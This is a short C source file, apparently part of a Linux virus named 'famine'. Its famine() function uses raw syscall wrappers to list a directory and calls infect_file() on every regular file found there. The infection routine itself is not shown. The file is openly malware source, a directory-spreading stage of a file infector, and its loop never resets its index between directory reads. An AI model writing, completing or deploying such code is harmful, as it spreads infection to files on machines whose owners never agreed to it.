#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static inline bool is_file (const unsigned char type)
{
	return type == FILE_TYPE;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void famine(const char *dir)
{
		
	int fd = 0;
	int index = 0;
	int limit = 0;
	char buf[BUFF_SIZE];
	struct linux_dirent64 *dirp;

	if ((fd = _open(dir, O_RDONLY | O_DIRECTORY, 0000)) == -1)
		return ;
	
	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);

			if (is_file(dirp->d_type) == true)
				infect_file(dirp->d_name);

			index += dirp->d_reclen;
		}
	}

	_close(fd);
}
